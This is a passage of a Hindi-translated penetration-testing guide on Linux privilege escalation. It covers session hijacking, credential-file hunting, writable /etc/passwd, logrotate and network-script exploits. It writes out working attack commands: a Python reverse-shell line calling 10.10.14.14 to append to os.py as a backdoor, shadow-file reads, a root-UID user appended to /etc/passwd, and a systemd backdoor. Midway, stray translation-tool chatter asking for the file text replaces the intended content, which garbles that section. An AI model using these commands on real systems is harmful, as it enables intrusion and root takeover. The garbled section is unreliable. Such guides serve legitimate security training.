**नवीनतम संस्करण** में आप केवल अपने **your own user** के screen sessions से **connect** कर पाएँगे। हालांकि, आप **session के अंदर दिलचस्प जानकारी** पा सकते हैं।

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**सत्र से जुड़ें**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux सत्रों का हाईजैकिंग

यह **पुराने tmux संस्करणों** के साथ एक समस्या थी। मैं root द्वारा बनाए गए tmux (v2.1) सत्र को एक non-privileged user के रूप में हाईजैक नहीं कर पाया।

**tmux सत्रों की सूची**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**एक session से जुड़ें**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

सितंबर 2006 और 13 मई, 2008 के बीच Debian-आधारित सिस्टम (Ubuntu, Kubuntu, आदि) पर उत्पन्न किए गए सभी SSL और SSH keys इस बग से प्रभावित हो सकते हैं.\
यह बग उन OS में नया ssh key बनाते समय होता है, क्योंकि **केवल 32,768 संभावनाएँ उपलब्ध थीं**। इसका अर्थ है कि सभी संभावनाएँ गणना की जा सकती हैं और **ssh public key होने पर आप उसके संबंधित private key की खोज कर सकते हैं**। आप गणना की गई संभावनाएँ यहाँ पा सकते हैं: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** यह निर्दिष्ट करता है कि password authentication की अनुमति है या नहीं। डिफ़ॉल्ट `no` है।
- **PubkeyAuthentication:** यह निर्दिष्ट करता है कि public key authentication की अनुमति है या नहीं। डिफ़ॉल्ट `yes` है।
- **PermitEmptyPasswords**: जब password authentication सक्षम हो, यह निर्दिष्ट करता है कि सर्वर क्या खाली password स्ट्रिंग वाले अकाउंट्स में लॉगिन की अनुमति देता है या नहीं। डिफ़ॉल्ट `no` है।

### PermitRootLogin

निर्दिष्ट करता है कि root ssh का उपयोग करके लॉग इन कर सकता है या नहीं; डिफ़ॉल्ट `no` है। संभावित मान:

- `yes`: root password और private key का उपयोग करके लॉगिन कर सकता है।
- `without-password` or `prohibit-password`: root केवल private key के साथ ही लॉगिन कर सकता है।
- `forced-commands-only`: Root केवल private key का उपयोग करके लॉगिन कर सकता है और तभी जब commands विकल्प निर्दिष्ट किए गए हों।
- `no` : अनुमति नहीं

### AuthorizedKeysFile

उस फाइलों को निर्दिष्ट करता है जिनमें user authentication के लिए उपयोग होने वाले public keys होते हैं। इसमें `%h` जैसे टोकन हो सकते हैं, जिन्हें होम डायरेक्टरी से बदल दिया जाएगा। **आप absolute paths संकेत कर सकते हैं** (जो `/` से शुरू होते हैं) या **relative paths यूज़र के होम से**। उदाहरण के लिए:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding आपको **use your local SSH keys instead of leaving keys** (without passphrases!) sitting on your server की सुविधा देता है। इसलिए, आप ssh के माध्यम से **jump** करके **to a host** पहुंच सकेंगे और वहाँ से **jump to another** host कर सकेंगे, **using** the **key** located in your **initial host**।

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
ध्यान दें कि यदि `Host` `*` है तो हर बार जब user किसी अलग मशीन पर जाता है, वह host keys तक access कर सकेगा (जो एक security issue है)।

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

यदि आप पाते हैं कि Forward Agent किसी environment में configured है तो निम्न पेज पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## दिलचस्प फाइलें

### Profiles फ़ाइलें

फाइल `/etc/profile` और `/etc/profile.d/` के अंतर्गत की फाइलें वो **scripts that are executed when a user runs a new shell** हैं। इसलिए, यदि आप उनमें से किसी को भी **write or modify** कर सकते हैं तो आप **escalate privileges** कर सकते हैं।
```bash
ls -l /etc/profile /etc/profile.d/
```
यदि कोई अजीब profile script मिल जाए तो आपको इसे **संवेदनशील विवरणों** के लिए जांचना चाहिए।

### Passwd/Shadow फाइलें

Depending on the OS the `/etc/passwd` and `/etc/shadow` files may be using a different name or there may be a backup. Therefore it's recommended **find all of them** and **check if you can read** them to see **if there are hashes** inside the files:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
कभी-कभी आप `/etc/passwd` (या समकक्ष) फ़ाइल के अंदर **password hashes** पा सकते हैं।
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### लिखने योग्य /etc/passwd

पहले, निम्नलिखित कमांड्स में से किसी एक से पासवर्ड जनरेट करें।
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the contents of src/linux-hardening/privilege-escalation/README.md. Please paste the file text you want translated.

Also confirm:
- Do you want a generated password included in plain text in the translated file, or a placeholder/creation command instead?
- If plain text, specify length/charset for the password (or I can generate a secure one, e.g. 16 chars).
- Where should I add the "hacker" user entry in the file (end, specific section)?
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
उदा: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

अब आप `su` कमांड का उपयोग `hacker:hacker` के साथ कर सकते हैं

वैकल्पिक रूप से, आप बिना पासवर्ड के एक डमी उपयोगकर्ता जोड़ने के लिए निम्न पंक्तियों का उपयोग कर सकते हैं.\
चेतावनी: आप मशीन की वर्तमान सुरक्षा को कमज़ोर कर सकते हैं।
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
नोट: BSD प्लेटफ़ॉर्म्स में `/etc/passwd` `/etc/pwd.db` और `/etc/master.passwd` पर स्थित होता है, और `/etc/shadow` का नाम `/etc/spwd.db` रखा गया है।

आपको यह जाँचना चाहिए कि क्या आप **कुछ संवेदनशील फ़ाइलों में लिख सकते हैं**। उदाहरण के लिए, क्या आप किसी **सेवा कॉन्फ़िगरेशन फाइल** में लिख सकते हैं?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
उदाहरण के लिए, अगर मशीन पर **tomcat** server चल रहा है और आप **modify the Tomcat service configuration file inside /etc/systemd/,** तो आप इन लाइनों को modify कर सकते हैं:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
आपका backdoor अगली बार tomcat शुरू होने पर चल जाएगा।

### फोल्डरों की जाँच करें

निम्नलिखित फोल्डर में बैकअप या रोचक जानकारी हो सकती है: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (शायद आप आखिरी को पढ़ न पाएँगे पर कोशिश करें)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### विचित्र स्थान/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### पिछले मिनटों में संशोधित फ़ाइलें
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB फाइलें
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फ़ाइलें
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### छिपी हुई फ़ाइलें
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries in PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **वेब फ़ाइलें**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **बैकअप्स**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### पासवर्ड रखने वाली ज्ञात फाइलें

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) के कोड को पढ़ें, यह **कई ऐसी फाइलें खोजता है जिनमें पासवर्ड हो सकते हैं**।\
**एक और दिलचस्प टूल** जिसे आप इसके लिए इस्तेमाल कर सकते हैं: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) जो एक ओपन-सोर्स एप्लिकेशन है और Windows, Linux & Mac पर लोकल कंप्यूटर में स्टोर बहुत सारे पासवर्ड निकालने के लिए इस्तेमाल होता है।

### लॉग्स

अगर आप लॉग्स पढ़ सकते हैं, तो आप उनके अंदर **दिलचस्प/गोपनीय जानकारी** पा सकते हैं। जितना ज्यादा अजीब लॉग होगा, उतना ही अधिक रोचक होगा (शायद)।\
इसके अलावा, कुछ "**bad**" कॉन्फ़िगर किए गए (backdoored?) **audit logs** आपको audit logs में **पासवर्ड रिकॉर्ड करने** की अनुमति दे सकते हैं जैसा कि इस पोस्ट में समझाया गया है: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
लॉग पढ़ने के लिए **लॉग पढ़ने वाला समूह** [**adm**](interesting-groups-linux-pe/index.html#adm-group) बहुत मददगार होगा।

### Shell फ़ाइलें
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

You should also check for files containing the word "**password**" in its **name** or inside the **content**, and also check for IPs and emails inside logs, or hashes regexps.\
आपको उन फाइलों की भी जाँच करनी चाहिए जिनके नाम में या उनके कंटेंट में शब्द "**password**" शामिल हो, और साथ ही logs के अंदर IPs और emails या hashes के लिए regexps भी चेक करें।\
मैं यहाँ यह सब कैसे करना है विस्तार से नहीं बताऊंगा, लेकिन अगर आप इच्छुक हैं तो आप देख सकते हैं कि [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) कौन से अंतिम checks करता/अंजाम देता है।

## Writable files

### Python library hijacking

If you know from **where** a python script is going to be executed and you **can write inside** that folder or you can **modify python libraries**, you can modify the OS library and backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library).

यदि आप जानते हैं कि कोई python script किस स्थान से execute होने वाली है और आप उस फ़ोल्डर में लिख सकते हैं या python libraries modify कर सकते हैं, तो आप OS library को modify करके उसे backdoor कर सकते हैं (यदि आप उस जगह लिख सकते हैं जहाँ python script execute होगी, तो os.py library को copy और paste कर लें)।

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):

Library को **backdoor** करने के लिए बस os.py library के अंत में निम्नलिखित लाइन जोड़ें (IP और PORT बदलें):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` में एक vulnerability यह अनुमति देती है कि लॉग फ़ाइल या उसके parent डायरेक्टरीज़ पर **लिखने की अनुमति** वाले उपयोगकर्ता संभावित रूप से उच्चाधिकार प्राप्त कर सकते हैं। इसका कारण यह है कि `logrotate`, जो अक्सर **root** के रूप में चलता है, को manipulate करके arbitrary फ़ाइलें execute कराने के लिए इस्तेमाल किया जा सकता है, ख़ासकर डायरेक्टरीज़ जैसे _**/etc/bash_completion.d/**_. यह महत्वपूर्ण है कि permissions सिर्फ _/var/log_ में ही नहीं बल्कि उन किसी भी डायरेक्टरी में भी जाँचें जहाँ log rotation लागू किया गया है।

> [!TIP]
> यह vulnerability `logrotate` version `3.18.0` और पुराने संस्करणों को प्रभावित करती है

इस vulnerability के बारे में अधिक विस्तृत जानकारी इस पृष्ठ पर मिल सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

आप इस vulnerability का exploit [**logrotten**](https://github.com/whotwagner/logrotten) के साथ कर सकते हैं।

यह vulnerability [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** के बहुत समान है, इसलिए जब भी आप पाते हैं कि आप logs को बदल सकते हैं, तो देखें कि कौन उन logs का प्रबंधन कर रहा है और जाँचें कि क्या आप logs को symlinks से बदलकर privileges escalate कर सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**कमज़ोरी संदर्भ:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

यदि किसी भी कारण से कोई उपयोगकर्ता _/etc/sysconfig/network-scripts_ में `ifcf-<whatever>` स्क्रिप्ट **लिख** सके या किसी मौजूदा स्क्रिप्ट को **समायोजित** कर सके, तो आपका **system is pwned**।

Network scripts, _ifcg-eth0_ जैसे उदाहरण नेटवर्क कनेक्शनों के लिए उपयोग होते हैं। ये बिल्कुल .INI फ़ाइलों की तरह दिखते हैं। हालाँकि, इन्हें Linux पर Network Manager (dispatcher.d) द्वारा \~sourced\~ किया जाता है।

मेरे मामले में, इन network scripts में `NAME=` atribuited सही तरीके से हैंडल नहीं किया जा रहा था। यदि नाम में **खाली/ब्लैंक स्पेस** है तो सिस्टम उस खाली/स्पेस के बाद के हिस्से को execute करने की कोशिश करता है। इसका मतलब यह है कि **पहले खाली स्थान के बाद का हर भाग root के रूप में execute किया जाता है**।

उदाहरण के लिए: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_ध्यान दें Network और /bin/id_ के बीच रिक्त स्थान है_)

### **init, init.d, systemd, and rc.d**

डायरेक्टरी `/etc/init.d` System V init (SysVinit) के लिए **scripts** का घर है, यह **पारंपरिक Linux सेवा प्रबंधन प्रणाली** है। इसमें सेवाओं को `start`, `stop`, `restart`, और कभी-कभी `reload` करने वाले scripts शामिल होते हैं। इन्हें सीधे चलाया जा सकता है या `/etc/rc?.d/` में पाए जाने वाले symbolic links के माध्यम से। Redhat सिस्टम्स में वैकल्पिक पथ `/etc/rc.d/init.d` है।

दूसरी ओर, `/etc/init` **Upstart** से जुड़ा है, जो Ubuntu द्वारा पेश किया गया नया **सेवा प्रबंधन** है, और यह सेवा प्रबंधन कार्यों के लिए कॉन्फ़िगरेशन फ़ाइलों का उपयोग करता है। Upstart में संक्रमण के बावजूद, compatibility layer के कारण SysVinit scripts अभी भी Upstart configurations के साथ उपयोग किए जाते हैं।

**systemd** आधुनिक initialization और service manager के रूप में उभरा है, जो on-demand daemon starting, automount management, और system state snapshots जैसे उन्नत सुविधाएँ प्रदान करता है। यह फाइलों को वितरण पैकेजों के लिए `/usr/lib/systemd/` और प्रशासकीय संशोधनों के लिए `/etc/systemd/system/` में व्यवस्थित करता है, जिससे system administration प्रक्रिया सुगम होती है।

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks आमतौर पर privileged kernel functionality को userspace manager को एक्सपोज़ करने के लिए एक syscall hook करते हैं। कमजोर manager authentication (उदा., FD-order पर आधारित signature checks या कमजोर password schemes) एक local app को manager का impersonate करने और पहले से-rooted devices पर root तक escalate करने में सक्षम कर सकता है। अधिक जानें और exploitation विवरण यहाँ:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations में regex-driven service discovery process command lines से एक binary path निकाल सकता है और उसे privileged context में `-v` के साथ execute कर सकता है। Permissive patterns (उदा., `\S` का उपयोग) writable locations (जैसे `/tmp/httpd`) में attacker-staged listeners से मेल खा सकते हैं, जिससे root के रूप में execution हो सकता है (CWE-426 Untrusted Search Path).

अधिक जानें और अन्य discovery/monitoring stacks पर लागू एक सामान्यीकृत pattern यहाँ देखें:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel सुरक्षा उपाय

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## और मदद

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux local privilege escalation vectors खोजने के लिए सबसे अच्छा टूल:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux और MAC में kernel vulns को enumerate करने का टूल [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## संदर्भ

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
